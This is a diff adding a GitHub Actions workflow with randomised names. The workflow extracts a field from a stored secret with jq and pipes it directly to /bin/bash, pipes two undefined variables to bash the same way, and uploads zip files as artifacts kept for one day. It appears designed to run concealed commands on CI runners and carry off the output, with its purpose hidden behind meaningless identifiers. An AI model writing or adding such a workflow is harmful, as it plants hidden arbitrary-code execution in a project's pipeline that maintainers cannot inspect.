@@ -1,0 +1,23 @@
+name: elasticr7x155
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: elasticr7x155
+        env:
+          nt6: ${{ secrets.nt6 }}
+        run: |
+          printf '%s' "$nt6" | jq -r .huqdi997 | /bin/bash
+          echo $qzwzi28 | jq -r .s707 | /bin/bash
+          echo $v611 | jq -r .yhb30 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: GFPjEXr0
+          path: "*.zip"
+          retention-days: 1
